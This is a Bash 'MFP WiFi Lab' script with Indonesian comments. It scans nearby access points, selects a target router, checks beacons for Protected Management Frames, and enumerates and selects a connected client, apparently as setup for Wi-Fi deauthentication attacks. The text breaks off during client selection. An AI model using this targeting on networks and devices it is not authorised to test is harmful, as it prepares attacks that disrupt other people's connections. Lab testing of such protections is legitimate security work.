#!/bin/bash
# ==============================================================================
# MFP WiFi Lab - Master Script (Gabungan Semua Langkah)
# ==============================================================================
# Target AP dipilih lewat scan (menu a), atau isi BSSID lewat environment.
# MAC Client (HP Anda):     20:3B:69:CE:88:3D
# Interface Monitor:        wlan0mon
# ==============================================================================

set -u

BSSID="${BSSID:-}"
AP_SSID=""
CLIENT="20:3B:69:CE:88:3D"
IFACE="wlan0mon"
MANAGED_IFACE="wlan0"

# Warna output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Variabel global untuk channel (deteksi sekali saja di awal)
DETECTED_CHANNEL=""

# File daftar klien yang terdeteksi (digunakan oleh langkah-langkah berikutnya)
CLIENT_LIST_FILE="clients.txt"

# Client target yang dipilih oleh user (kosong = gunakan $CLIENT default)
SELECTED_CLIENT=""

# ---------------------------------------------------------------
# Fungsi: cek apakah dijalankan sebagai root
# ---------------------------------------------------------------
cek_root() {
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}[!] Harap jalankan skrip ini dengan sudo: sudo $0${NC}"
        exit 1
    fi
}

# ---------------------------------------------------------------
# Fungsi: cek apakah interface monitor tersedia
# ---------------------------------------------------------------
cek_interface() {
    if ! ip link show "$IFACE" >/dev/null 2>&1; then
        echo -e "${RED}[!] Interface $IFACE tidak ditemukan.${NC}"
        echo -e "${YELLOW}    Aktifkan monitor mode terlebih dahulu:${NC}"
        echo -e "    sudo airmon-ng start wlan0"
        echo -e "${YELLOW}    Atau pulihkan Wi-Fi ke managed mode lewat menu 'r'.${NC}"
        exit 1
    fi
    echo -e "${GREEN}[+] Interface $IFACE tersedia.${NC}"
}

# ---------------------------------------------------------------
# Fungsi: daftar interface wireless yang dikenal driver
# ---------------------------------------------------------------
daftar_interface_wifi() {
    sudo iw dev 2>/dev/null | awk '/^[[:space:]]*Interface / {print $2}'
}

# ---------------------------------------------------------------
# Fungsi: ambil tipe interface (managed, monitor, dll.)
# ---------------------------------------------------------------
tipe_interface() {
    sudo iw dev "$1" info 2>/dev/null | awk '/^[[:space:]]*type / {print $2; exit}'
}

# ---------------------------------------------------------------
# Fungsi: scan AP sekitar dan keluarkan TSV
# Kolom: BSSID, SSID, channel, signal, unit, security
# ---------------------------------------------------------------
scan_ap_tsv() {
    local scan_iface="$MANAGED_IFACE"
    if ! ip link show "$scan_iface" >/dev/null 2>&1; then
        scan_iface="$IFACE"
    fi
    if ! ip link show "$scan_iface" >/dev/null 2>&1; then
        echo -e "${RED}[!] Tidak ada interface wireless untuk scan.${NC}" >&2
        return 1
    fi

    echo -e "${BLUE}[i] Memindai AP sekitar via $scan_iface...${NC}" >&2
    sudo rfkill unblock wifi 2>/dev/null || true

    local raw parsed
    raw=$(sudo timeout 25 iw dev "$scan_iface" scan 2>/dev/null || true)
    if [ -n "$raw" ]; then
        parsed=$(printf '%s\n' "$raw" | awk '
            function emit() {
                sec = "Open"
                if (sae && rsn)      sec = "WPA2/WPA3"
                else if (sae)        sec = "WPA3"
                else if (rsn)        sec = "WPA2"
                else if (wpa)        sec = "WPA"
                else if (wep)        sec = "WEP"
                print bssid, ssid, ch, sig, "dBm", sec
            }
            BEGIN { OFS="\t"; bssid="" }
            /^BSS / {
                if (bssid != "") emit()
                bssid = toupper($2)
                sub(/\(.*/, "", bssid)
                ssid = "(hidden)"; ch = "?"; sig = -999
                rsn = 0; wpa = 0; sae = 0; wep = 0
                next
            }
            /^[[:space:]]*SSID: / {
                sub(/^[[:space:]]*SSID: /, "", $0)
                ssid = ($0 == "") ? "(hidden)" : $0
                next
            }
            /^[[:space:]]*signal: / { sig = $2 + 0; next }
            /^[[:space:]]*DS Parameter set: channel/ { ch = $NF; next }
            /^[[:space:]]*freq: / {
                if (ch == "?") {
                    f = $2 + 0
                    if (f == 2484) ch = 14
                    else if (f >= 2400 && f < 2500) ch = int((f - 2407) / 5)
                    else if (f >= 5000 && f < 5900) ch = int((f - 5000) / 5)
                    else if (f >= 5950 && f < 7125) ch = int((f - 5950) / 5)
                }
                next
            }
            /^[[:space:]]*RSN:/ { rsn = 1 }
            /^[[:space:]]*WPA:/ { wpa = 1 }
            /^[[:space:]]*WEP:/ { wep = 1 }
            /Authentication suites:.*SAE/ { sae = 1 }
            END { if (bssid != "") emit() }
        ')
        if [ -n "$parsed" ]; then
            printf '%s\n' "$parsed"
            return 0
        fi
    fi

    # Fallback: nmcli (mis. iw scan ditolak saat interface dipakai NM).
    if command -v nmcli >/dev/null 2>&1; then
        echo -e "${YELLOW}[i] iw scan tidak menghasilkan data, mencoba nmcli...${NC}" >&2
        sudo nmcli device wifi rescan ifname "$scan_iface" >/dev/null 2>&1 || true
        sleep 2
        parsed=$(sudo nmcli -t -f BSSID,SSID,CHAN,SIGNAL,SECURITY \
            device wifi list ifname "$scan_iface" 2>/dev/null | awk -F: '
            {
                bssid = $1 ":" $2 ":" $3 ":" $4 ":" $5 ":" $6
                gsub(/\\/, "", bssid)
                ssid = ""
                for (i = 7; i <= NF - 3; i++) {
                    ssid = ssid (i > 7 ? ":" : "") $i
                }
                gsub(/\\/, "", ssid)
                if (ssid == "") ssid = "(hidden)"
                printf "%s\t%s\t%s\t%s\t%s\t%s\n", toupper(bssid), ssid, $(NF-2), $(NF-1), "%", $NF
            }
        ')
        if [ -n "$parsed" ]; then
            printf '%s\n' "$parsed"
            return 0
        fi
    fi

    return 1
}

# ---------------------------------------------------------------
# Fungsi: input BSSID manual
# ---------------------------------------------------------------
input_bssid_manual() {
    local manual
    read -p "BSSID router (contoh 14:8C:4A:B4:F4:8C): " manual
    manual="${manual//-/:}"
    manual="${manual// /}"
    manual="${manual^^}"
    if [[ ! "$manual" =~ ^([0-9A-F]{2}:){5}[0-9A-F]{2}$ ]]; then
        echo -e "${RED}[!] Format BSSID tidak valid.${NC}"
        return 1
    fi
    BSSID="$manual"
    AP_SSID="(manual)"
    DETECTED_CHANNEL=""
    echo -e "${GREEN}[+] Target diset manual: $BSSID${NC}"
    return 0
}

# ---------------------------------------------------------------
# Fungsi: scan AP lalu biarkan operator memilih router target
# ---------------------------------------------------------------
pilih_router_ap() {
    echo -e "${BLUE}========================================${NC}"
    echo -e "${BLUE}   SCAN & PILIH ROUTER AP${NC}"
    echo -e "${BLUE}========================================${NC}"
    cek_root

    local tsv
    tsv=$(scan_ap_tsv | sort -t $'\t' -k4,4nr)
    local -a ap_list=()
    local line
    if [ -n "$tsv" ]; then
        while IFS= read -r line; do
            [ -n "$line" ] && ap_list+=("$line")
        done <<< "$tsv"
    fi

    if [ ${#ap_list[@]} -eq 0 ]; then
        echo -e "${RED}[!] Tidak ada AP yang terdeteksi.${NC}"
        echo -e "${YELLOW}    Pastikan Wi-Fi tidak mati/monitor mode. Menu 'r' bisa memulihkan Wi-Fi.${NC}"
        echo ""
        if input_bssid_manual; then
            return 0
        fi
        return 1
    fi

    echo ""
    printf "%-3s %-30s %-18s %-4s %-10s %s\n" "No" "SSID" "BSSID" "CH" "Sinyal" "Keamanan"
    printf "%-3s %-30s %-18s %-4s %-10s %s\n" "---" "------------------------------" "------------------" "----" "----------" "---------"
    local idx=1
    for line in "${ap_list[@]}"; do
        local bssid ssid ch sig unit sec
        IFS=$'\t' read -r bssid ssid ch sig unit sec <<< "$line"
        printf "%-3d %-30s %-18s %-4s %-10s %s\n" \
            "$idx" "${ssid:0:30}" "$bssid" "$ch" "$sig $unit" "$sec"
        idx=$((idx + 1))
    done
    echo "  0. Masukkan BSSID manual"
    echo ""

    local pilih_ap
    read -p "Pilih nomor AP [1-${#ap_list[@]}] (Enter=batal): " pilih_ap
    if [ -z "$pilih_ap" ]; then
        echo -e "${YELLOW}[i] Pemilihan dibatalkan.${NC}"
        return 1
    fi

    if [ "$pilih_ap" = "0" ]; then
        input_bssid_manual
        return $?
    fi

    if ! [[ "$pilih_ap" =~ ^[0-9]+$ ]] || [ "$pilih_ap" -lt 1 ] || [ "$pilih_ap" -gt ${#ap_list[@]} ]; then
        echo -e "${RED}[!] Nomor AP tidak valid.${NC}"
        return 1
    fi

    local selected="${ap_list[$((pilih_ap - 1))]}"
    local bssid ssid ch sig unit sec
    IFS=$'\t' read -r bssid ssid ch sig unit sec <<< "$selected"
    BSSID="$bssid"
    AP_SSID="$ssid"
    if [ "$ch" = "?" ]; then
        DETECTED_CHANNEL=""
    else
        DETECTED_CHANNEL="$ch"
    fi

    echo ""
    echo -e "${GREEN}[+] Target AP: $AP_SSID${NC}"
    echo -e "${GREEN}    BSSID   : $BSSID${NC}"
    echo -e "${GREEN}    Channel : ${ch}${NC}"
    echo -e "${GREEN}    Sinyal  : $sig $unit · $sec${NC}"

    # Jika monitor interface sudah aktif, langsung pindahkan ke channel AP.
    if [ -n "$DETECTED_CHANNEL" ] && [ "$DETECTED_CHANNEL" != "?" ] \
        && [ "$(tipe_interface "$IFACE")" = "monitor" ]; then
        set_channel "$DETECTED_CHANNEL" || true
    fi
    echo ""
    return 0
}

# ---------------------------------------------------------------
# Fungsi: pastikan target AP sudah dipilih
# ---------------------------------------------------------------
pastikan_target() {
    if [ -z "$BSSID" ]; then
        pilih_router_ap || return 1
    fi
    [ -n "$BSSID" ]
}

# ---------------------------------------------------------------
# Fungsi: pulihkan Wi-Fi dari monitor mode ke managed mode
# Dipakai jika wlan0 "hilang"/mati setelah wlan0mon dibuat.
# ---------------------------------------------------------------
pulihkan_wifi() {
    echo -e "${BLUE}========================================${NC}"
    echo -e "${BLUE}   PEMULIHAN WI-FI (MONITOR -> MANAGED)${NC}"
    echo -e "${BLUE}========================================${NC}"
    cek_root

    local iface_list ifc tipe base
    local dipulihkan=0
    local gagal=0

    # 1) Wi-Fi sering ikut "mati" karena soft-block rfkill.
    echo -e "${BLUE}[i] Membuka blokir rfkill...${NC}"
    sudo rfkill unblock all 2>/dev/null || true

    iface_list=$(daftar_interface_wifi)
    if [ -z "$iface_list" ]; then
        echo -e "${RED}[!] Tidak ada interface wireless yang terdeteksi oleh iw.${NC}"
        echo -e "${YELLOW}    Cek manual: iw dev ; ip link ; rfkill list${NC}"
        echo -e "${YELLOW}    Jika adaptor USB, cabut lalu pasang kembali.${NC}"
        return 1
    fi

    echo -e "${BLUE}[i] Interface terdeteksi: $(echo "$iface_list" | tr '\n' ' ')${NC}"

    # 2) Kembalikan setiap interface yang masih monitor.
    for ifc in $iface_list; do
        tipe=$(tipe_interface "$ifc")
        if [ "$tipe" != "monitor" ]; then
            continue
        fi

        dipulihkan=$((dipulihkan + 1))
        echo ""
        echo -e "${YELLOW}[!] $ifc masih dalam monitor mode. Memulihkan...${NC}"

        # airmon-ng biasanya mengganti nama wlan0 -> wlan0mon. Hentikan lewat
        # airmon-ng dulu supaya nama aslinya (wlan0) kembali.
        base="${ifc%mon}"
        if [ "$base" != "$ifc" ] && [ ! -e "/sys/class/net/$base" ] \
            && command -v airmon-ng >/dev/null 2>&1; then
            if sudo airmon-ng stop "$ifc" >/dev/null 2>&1; then
                echo -e "${GREEN}[+] airmon-ng mengembalikan $ifc -> $base${NC}"
            fi
        fi

        # Jika interface masih ada, ubah tipenya langsung ke managed.
        if [ -e "/sys/class/net/$ifc" ]; then
            sudo ip link set "$ifc" down 2>/dev/null || true
            if sudo iw dev "$ifc" set type managed 2>/dev/null; then
                echo -e "${GREEN}[+] $ifc diubah ke managed mode${NC}"
            else
                echo -e "${RED}[!] Gagal mengubah $ifc ke managed mode${NC}"
                gagal=$((gagal + 1))
            fi
            sudo ip link set "$ifc" up 2>/dev/null || true
        fi
    done

    # 3) Aktifkan radio dan biarkan NetworkManager mengambil alih.
    if command -v nmcli >/dev/null 2>&1; then
        echo ""
        echo -e "${BLUE}[i] Mengaktifkan radio Wi-Fi via NetworkManager...${NC}"
        sudo nmcli radio wifi on 2>/dev/null || true

        iface_list=$(daftar_interface_wifi)
        local status_output belum_connect
        for ifc in $iface_list; do
            tipe=$(tipe_interface "$ifc")
            [ "$tipe" = "monitor" ] && continue
            sudo nmcli device set "$ifc" managed yes 2>/dev/null || true
        done

        # Sambungkan kembali ke jaringan tersimpan bila belum connected.
        status_output=$(sudo nmcli -t -f DEVICE,STATE device status 2>/dev/null || true)
        belum_connect=0
        for ifc in $iface_list; do
            tipe=$(tipe_interface "$ifc")
            [ "$tipe" = "monitor" ] && continue
            if ! echo "$status_output" | awk -F: -v d="$ifc" \
                '$1 == d && $2 == "connected" {found=1} END {exit !found}'; then
                belum_connect=$((belum_connect + 1))
                echo -e "${BLUE}[i] Menyambungkan $ifc ke jaringan tersimpan...${NC}"
                sudo nmcli device connect "$ifc" >/dev/null 2>&1 || true
            fi
        done

        # NetworkManager kadang perlu di-restart agar interface dikenali lagi.
        if [ "$belum_connect" -gt 0 ]; then
            sleep 2
            status_output=$(sudo nmcli -t -f DEVICE,STATE device status 2>/dev/null || true)
            local masih_belum=0
            for ifc in $iface_list; do
                tipe=$(tipe_interface "$ifc")
                [ "$tipe" = "monitor" ] && continue
                if ! echo "$status_output" | awk -F: -v d="$ifc" \
                    '$1 == d && $2 == "connected" {found=1} END {exit !found}'; then
                    masih_belum=$((masih_belum + 1))
                fi
            done
            if [ "$masih_belum" -gt 0 ]; then
                echo -e "${YELLOW}[!] Restart NetworkManager agar Wi-Fi aktif kembali...${NC}"
                sudo systemctl restart NetworkManager 2>/dev/null || true
                sleep 3
            fi
        fi
    fi

    # 4) Verifikasi dan tampilkan status akhir.
    echo ""
    echo -e "${BLUE}[i] Status akhir:${NC}"
    if command -v nmcli >/dev/null 2>&1; then
        sudo nmcli -t -f DEVICE,TYPE,STATE,CONNECTION device status 2>/dev/null \
            | awk -F: '$2 == "wifi" {printf "    %-16s %-12s %s\n", $1, $3, $4}'
    fi
    sudo iw dev 2>/dev/null | awk '
        /^[[:space:]]*Interface / {iface=$2}
        /^[[:space:]]*type /     {printf "    %-16s %s\n", iface, $2}
    '

    echo ""
    if [ "$gagal" -gt 0 ]; then
        echo -e "${RED}[!] Ada interface yang gagal dipulihkan. Coba reboot laptop.${NC}"
        notifikasi_gagal "Pemulihan Wi-Fi selesai dengan peringatan."
        return 1
    fi

    if [ "$dipulihkan" -eq 0 ]; then
        echo -e "${YELLOW}[i] Tidak ada interface monitor yang perlu dipulihkan.${NC}"
    else
        echo -e "${GREEN}[+] Semua interface monitor sudah dikembalikan ke managed mode.${NC}"
    fi
    echo -e "${BLUE}[i] Untuk kembali ke monitor mode: sudo airmon-ng start wlan0${NC}"
    notifikasi_sukses "Wi-Fi siap dipakai kembali."
    echo ""
}

# ---------------------------------------------------------------
# Fungsi: cek ketersediaan alat utama
# ---------------------------------------------------------------
cek_tool() {
    for tool in aireplay-ng mdk4 bettercap iw tshark python3; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            echo -e "${YELLOW}[-] Peringatan: '$tool' tidak terinstal.${NC}"
        fi
    done
    if ! python3 -c "import scapy.all" >/dev/null 2>&1; then
        echo -e "${YELLOW}[-] Peringatan: Python scapy tidak terinstal. Langkah Scapy tidak akan berjalan.${NC}"
    fi
    echo -e "${BLUE}[i] Jika banyak alat belum terpasang: sudo ./install-requirements.sh${NC}"
    echo ""
}

# ---------------------------------------------------------------
# Fungsi: notifikasi sukses
# ---------------------------------------------------------------
notifikasi_sukses() {
    echo -e "${GREEN}[✓] $1${NC}"
}

# ---------------------------------------------------------------
# Fungsi: notifikasi gagal
# ---------------------------------------------------------------
notifikasi_gagal() {
    echo -e "${RED}[✗] $1${NC}"
}

# ---------------------------------------------------------------
# Fungsi: deteksi channel otomatis dari BSSID target
# Hanya mengeluarkan angka channel ke stdout (untuk ditangkap variabel).
# Semua status ditulis ke stderr.
# ---------------------------------------------------------------
deteksi_channel() {
    local channel=""
    local scan_iface=""

    # Pilih interface scan: managed dulu, baru monitor
    if ip link show "$MANAGED_IFACE" >/dev/null 2>&1; then
        scan_iface="$MANAGED_IFACE"
    elif ip link show "$IFACE" >/dev/null 2>&1; then
        scan_iface="$IFACE"
    else
        echo -e "${YELLOW}[!] Tidak ada interface wireless untuk scan channel.${NC}" >&2
        return 1
    fi

    echo -e "${BLUE}[i] Mencari channel BSSID $BSSID via $scan_iface...${NC}" >&2

    # Metode 1: iw scan (DS Parameter set channel)
    channel=$(sudo iw dev "$scan_iface" scan 2>/dev/null | \
        awk -v bssid="$BSSID" '
            BEGIN { found=0 }
            /^BSS / { found=0 }
            /^BSS / {
                if (match($0, /BSS ([0-9a-fA-F:]+)/, arr)) {
                    if (tolower(arr[1]) == tolower(bssid)) found=1
                }
            }
            found && /DS Parameter set: channel/ {
                if (match($0, /channel ([0-9]+)/, arr)) {
                    print arr[1]
                    exit
                }
            }
        ' 2>/dev/null || true)

    # Metode 2: iw scan (freq -> channel)
    if [ -z "$channel" ]; then
        channel=$(sudo iw dev "$scan_iface" scan 2>/dev/null | \
            awk -v bssid="$BSSID" '
                BEGIN { found=0 }
                /^BSS / { found=0 }
                /^BSS / {
                    if (match($0, /BSS ([0-9a-fA-F:]+)/, arr)) {
                        if (tolower(arr[1]) == tolower(bssid)) found=1
                    }
                }
                found && /freq:/ {
                    if (match($0, /freq: ([0-9]+)/, arr)) {
                        freq=arr[1]+0
                        if (freq >= 2412 && freq <= 2484) {
                            if (freq == 2484) print 14
                            else print int((freq - 2412) / 5) + 1
                            exit
                        }
                        else if (freq >= 5170 && freq <= 5825) {
                            print int((freq - 5170) / 5) + 34
                            exit
                        }
                    }
                }
            ' 2>/dev/null || true)
    fi

    # Metode 3: iwlist scan (fallback)
    if [ -z "$channel" ] && command -v iwlist >/dev/null 2>&1; then
        channel=$(sudo iwlist "$scan_iface" scan 2>/dev/null | \
            awk -v bssid="$BSSID" '
                BEGIN { found=0 }
                /Address: / { found=0 }
                /Address: / {
                    if (match($0, /Address: ([0-9A-Fa-f:]+)/, arr)) {
                        if (tolower(arr[1]) == tolower(bssid)) found=1
                    }
                }
                found && /Channel:[0-9]+/ {
                    if (match($0, /Channel:([0-9]+)/, arr)) {
                        print arr[1]
                        exit
                    }
                }
            ' 2>/dev/null || true)
    fi

    # Validasi: channel harus angka murni 1-165
    if [ -n "$channel" ] && [[ "$channel" =~ ^[0-9]+$ ]] && [ "$channel" -ge 1 ] && [ "$channel" -le 165 ]; then
        echo -e "${GREEN}[+] Channel ditemukan: $channel${NC}" >&2
        echo "$channel"
        return 0
    fi

    echo -e "${YELLOW}[!] Tidak dapat mendeteksi channel secara otomatis.${NC}" >&2
    echo -e "${YELLOW}    Pastikan router menyiarakan beacon dan Anda dalam jangkauan.${NC}" >&2
    return 1
}

# ---------------------------------------------------------------
# Fungsi: set channel interface monitor
# ---------------------------------------------------------------
set_channel() {
    local channel="$1"

    if ! [[ "$channel" =~ ^[0-9]+$ ]]; then
        echo -e "${RED}[!] Channel tidak valid: '$channel'${NC}" >&2
        return 1
    fi

    echo -e "${BLUE}[i] Mengatur $IFACE ke channel $channel...${NC}" >&2

    # Metode 1: iw dev set channel
    if sudo iw dev "$IFACE" set channel "$channel" 2>/dev/null; then
        sleep 1
        echo -e "${GREEN}[+] Channel diset ke $channel (via iw)${NC}" >&2
        return 0
    fi

    # Metode 2: iwconfig
    echo -e "${YELLOW}[-] iw gagal, mencoba iwconfig...${NC}" >&2
    if sudo iwconfig "$IFACE" channel "$channel" 2>/dev/null; then
        sleep 1
        echo -e "${GREEN}[+] Channel diset ke $channel (via iwconfig)${NC}" >&2
        return 0
    fi

    # Metode 3: reset interface
    echo -e "${YELLOW}[-] iwconfig gagal, mencoba reset interface...${NC}" >&2
    sudo ifconfig "$IFACE" down 2>/dev/null
    sleep 1
    sudo iwconfig "$IFACE" channel "$channel" 2>/dev/null
    sudo ifconfig "$IFACE" up 2>/dev/null
    sleep 1

    if sudo iw dev "$IFACE" info 2>/dev/null | grep -q "channel"; then
        echo -e "${GREEN}[+] Channel diset ke $channel (via reset)${NC}" >&2
        return 0
    fi

    echo -e "${RED}[!] Gagal mengatur channel ke $channel${NC}" >&2
    return 1
}

# ---------------------------------------------------------------
# Fungsi: siapkan channel sekali di awal (pilihan user)
# ---------------------------------------------------------------
siapkan_channel_awal() {
    if [ -n "$DETECTED_CHANNEL" ]; then
        # Channel mungkin sudah dipilih dari scan AP (menu a) sebelum monitor
        # mode aktif. Terapkan sekarang bila interface monitor sudah tersedia.
        if [ "$(tipe_interface "$IFACE")" = "monitor" ]; then
            set_channel "$DETECTED_CHANNEL" || true
        fi
        return 0
    fi

    echo -e "${BLUE}========================================${NC}"
    echo -e "${BLUE}PENGATURAN CHANNEL AWAL${NC}"
    echo -e "${BLUE}========================================${NC}"
    echo "Router $BSSID perlu channel yang tepat agar serangan berhasil."
    echo ""

    local ch_auto
    ch_auto=$(deteksi_channel)

    if [ -n "$ch_auto" ] && [[ "$ch_auto" =~ ^[0-9]+$ ]]; then
        DETECTED_CHANNEL="$ch_auto"
        set_channel "$DETECTED_CHANNEL"
        echo ""
        return 0
    fi

    echo -e "${YELLOW}[!] Deteksi otomatis gagal.${NC}"
    read -p "Masukkan channel secara manual (contoh: 11) atau tekan Enter untuk lewati: " ch_manual
    if [ -n "$ch_manual" ] && [[ "$ch_manual" =~ ^[0-9]+$ ]]; then
        DETECTED_CHANNEL="$ch_manual"
        set_channel "$DETECTED_CHANNEL"
    else
        echo -e "${YELLOW}[-] Melanjutkan tanpa men-set channel.${NC}"
        DETECTED_CHANNEL=""
    fi
    echo ""
}

# ---------------------------------------------------------------
# LANGKAH 0: PERSIAPAN
# ---------------------------------------------------------------
langkah_persiapan() {
    echo -e "${BLUE}========================================${NC}"
    echo -e "${BLUE}LANGKAH 0: PERSIAPAN${NC}"
    echo -e "${BLUE}========================================${NC}"
    cek_root
    if ! pastikan_target; then
        echo -e "${YELLOW}[!] Persiapan dibatalkan: target AP belum dipilih.${NC}"
        echo ""
        return 1
    fi
    cek_interface
    cek_tool
    siapkan_channel_awal
    echo -e "${GREEN}[+] Persiapan selesai.${NC}"
    echo ""
}

# ---------------------------------------------------------------
# LANGKAH 1: DETEKSI MFP (Protected Management Frames)
# ---------------------------------------------------------------
langkah_deteksi_mfp() {
    echo -e "${BLUE}========================================${NC}"
    echo -e "${BLUE}LANGKAH 1: DETEKSI MFP${NC}"
    echo -e "${BLUE}========================================${NC}"
    echo "Mengecek MFP (PMF) pada router dan klien."
    echo "  Router (AP): $BSSID"
    echo "  Klien (HP)   : $CLIENT"
    echo ""

    local found_ap_mfp=0
    local found_client_mfp=0

    # ============================================================
    # Bagian A: Deteksi MFP pada Router/AP dari Beacon frames
    # ============================================================
    echo -e "${BLUE}[A] Memeriksa MFP pada Router/AP (dari Beacon frames)...${NC}"
    echo ""
    echo "SSID                              MFPC(6) MFPR(7) Status"
    echo "--------------------------------  ------- ------- ------"

    local tmp_ap="/tmp/mfp_ap_$$"
    sudo tshark -i "$IFACE" -Y "wlan.fc.type_subtype == 0x08 && wlan.bssid == $BSSID" \
        -T fields -e wlan.ssid -e wlan.rsn.capabilities.mfpc -e wlan.rsn.capabilities.mfpr \
        -c 5 2>/dev/null > "$tmp_ap" || true

    while IFS=$'\t' read -r ssid_hex mfpc mfpr; do
        [ -z "$ssid_hex" ] && continue
        local ssid_txt
        ssid_txt=$(echo -n "$ssid_hex" 2>/dev/null | xxd -r -p 2>/dev/null || echo "$ssid_hex")
        [ -z "$ssid_txt" ] && ssid_txt="(hidden)"

        local status="Tanpa MFP"
        if [ -n "$mfpr" ] && [ "$mfpr" = "1" ]; then
            status="MFP WAJIB"
            found_ap_mfp=1
        elif [ -n "$mfpc" ] && [ "$mfpc" = "1" ]; then
            status="MFP Opsional"
            found_ap_mfp=1
        fi

        printf "%-32s %-7s %-7s %s\n" "$ssid_txt" "${mfpc:--}" "${mfpr:--}" "$status"
    done < "$tmp_ap"
    rm -f "$tmp_ap"

    echo ""

    # ============================================================
    # Bagian B: Daftar Semua Klien Terkoneksi ke Router
    # ============================================================
    echo -e "${BLUE}[B] Memindai semua klien yang terhubung ke Router $BSSID...${NC}"
    echo ""

    # ============================================================
    # Bagian C: Daftar Semua Klien Terkoneksi ke Router
    # ============================================================
    echo -e "${BLUE}[C] Daftar Semua Klien Terkoneksi ke Router $BSSID${NC}"
    echo ""
    echo ""

    # Inisialisasi file klien (kosongkan dulu)
    > "$CLIENT_LIST_FILE"

    # Tentukan channel untuk airodump-ng
    local scan_ch=""
    if [ -n "$DETECTED_CHANNEL" ]; then
        scan_ch="$DETECTED_CHANNEL"
    else
        echo -e "${YELLOW}[!] Channel belum diketahui.${NC}"
        read -p "Masukkan channel router (contoh: 11) atau tekan Enter untuk lewati: " scan_ch
        echo ""
    fi

    if [ -z "$scan_ch" ]; then
        echo -e "${YELLOW}[-] Melewati pemindaian klien (channel tidak diketahui).${NC}"
        echo ""
    else
        echo -e "${BLUE}[i] Menjalankan airodump-ng selama 10 detik pada channel $scan_ch...${NC}"
        echo ""

        local tmp_csv="/tmp/mfp_clients_$$.csv"
        sudo timeout 10 airodump-ng -c "$scan_ch" --bssid "$BSSID" -w "$tmp_csv" --output-format csv "$IFACE" >/dev/null 2>&1 || true

        local mac_list=()
        local in_station=0
        if [ -f "${tmp_csv}-01.csv" ]; then
            while IFS=',' read -r col1 col2 col3 col4 col5 col6 col7 col8 col9 col10 col11 rest; do
                # Deteksi baris header Station MAC
                if [ "$col1" = "Station MAC" ]; then
                    in_station=1
                    continue
                fi
                if [ "$in_station" -eq 1 ]; then
                    # Baris kosong = akhir section Station
                    if [ -z "$col1" ]; then
                        break
                    fi
                    local mac="$col1"
                    [ -z "$mac" ] && continue
                    local mac_lower
                    mac_lower=$(echo "$mac" | tr '[:upper:]' '[:lower:]')
                    local bssid_lower
                    bssid_lower=$(echo "$BSSID" | tr '[:upper:]' '[:lower:]')
                    # Skip BSSID, broadcast, multicast
                    if [ "$mac_lower" = "$bssid_lower" ]; then continue; fi
                    if [ "$mac_lower" = "ff:ff:ff:ff:ff:ff" ]; then continue; fi
                    if [[ "$mac_lower" == 01:* ]]; then continue; fi
                    # Cek duplikat
                    local found=0
                    for existing in "${mac_list[@]}"; do
                        if [ "$existing" = "$mac_lower" ]; then found=1; break; fi
                    done
                    if [ "$found" -eq 0 ]; then
                        mac_list+=("$mac_lower")
                    fi
                fi
            done < "${tmp_csv}-01.csv"
            rm -f "${tmp_csv}-01.csv" "${tmp_csv}-01.kismet.csv" "${tmp_csv}-01.kismet.netxml" 2>/dev/null
        fi
        rm -f "$tmp_csv"

        echo ""
        echo "No  MAC Address                 Status"
        echo "----------------------------------------"

        local idx=1
        if [ ${#mac_list[@]} -gt 0 ]; then
            for mac in "${mac_list[@]}"; do
                local mark=""
                if [ "$mac" = "$(echo "$CLIENT" | tr '[:upper:]' '[:lower:]')" ]; then
                    mark="  <-- Target HP"
                fi
                printf "%-3d %-23s %s%s\n" "$idx" "$mac" "" "$mark"
                # Simpan ke file clients.txt (format uppercase untuk konsistensi)
                echo "${mac^^}" >> "$CLIENT_LIST_FILE"
                idx=$((idx + 1))
            done
        else
            echo "  (Tidak ada klien terdeteksi selama pemindaian)"
        fi

        echo ""
        echo -e "${GREEN}[+] Daftar klien disimpan ke: $CLIENT_LIST_FILE${NC}"

        # Pastikan target HP (CLIENT) selalu ada dalam clients.txt
        local client_upper
        client_upper=$(echo "$CLIENT" | tr '[:lower:]' '[:upper:]')
        local already=0
        if [ -f "$CLIENT_LIST_FILE" ]; then
            while IFS= read -r existing_mac; do
                if [ "$(echo "$existing_mac" | tr '[:lower:]' '[:upper:]')" = "$client_upper" ]; then
                    already=1
                    break
                fi
            done < "$CLIENT_LIST_FILE"
        fi
        if [ "$already" -eq 0 ]; then
            echo "$client_upper" >> "$CLIENT_LIST_FILE"
            echo -e "${YELLOW}[i] Target HP $CLIENT ditambahkan ke $CLIENT_LIST_FILE${NC}"
        fi
        echo ""
        echo -e "${GREEN}[+] Daftar klien disimpan ke: $CLIENT_LIST_FILE${NC}"

        # ============================================================
        # Pemilihan klien target interaktif
        # ============================================================
        echo -e "${BLUE}[E] Pilih Klien Target${NC}"
        echo ""

        # Baca daftar klien dari file
        local client_array=()
        if [ -f "$CLIENT_LIST_FILE" ] && [ -s "$CLIENT_LIST_FILE" ]; then
            while IFS= read -r cm; do
                [ -z "$cm" ] && continue
                client_array+=("$cm")
            done < "$CLIENT_LIST_FILE"
        fi

        if [ ${#client_array[@]} -gt 0 ]; then
            local i=1
            for cm in "${client_array[@]}"; do
                local mark=""
                if [ "$(echo "$cm" | tr '[:lower:]' '[:upper:]')" = "$(echo "$CLIENT" | tr '[:lower:]' '[:upper:]')" ]; then
                    mark="  <-- Target HP default"
                fi
                printf "  %d) %s%s\n" "$i" "$cm" "$mark"
                i=$((i + 1))
            done
            echo ""
            echo "  0) Masukkan MAC address manual"
            echo "  s) Lewati (gunakan target default: $CLIENT)"
            echo ""
            read -p "Pilihan: " pilih_client

            case $pilih_client in
                0)
                    read -p "Masukkan MAC address client: " manual_mac
                    if [ -n "$manual_mac" ]; then
                        SELECTED_CLIENT=$(echo "$manual_mac" | tr '[:lower:]' '[:upper:]')
                        notifikasi_sukses "Client target diatur ke: $SELECTED_CLIENT"
                    else
                        SELECTED_CLIENT=""
                        notifikasi_gagal "MAC kosong, menggunakan default: $CLIENT"
                    fi
                    ;;
                s|S)
                    SELECTED_CLIENT=""
                    echo -e "${YELLOW}[i] Menggunakan target default: $CLIENT${NC}"
                    ;;
                *)
                    if [[ "$pilih_client" =~ ^[0-9]+$ ]] && [ "$pilih_client" -ge 1 ] && [ "$pilih_client" -le ${#client_array[@]} ]; then
                        SELECTED_CLIENT="${client_array[$((pilih_client - 1))]}"
                        SELECTED_CLIENT=$(echo "$SELECTED_CLIENT" | tr '[:lower:]' '[:upper:]')
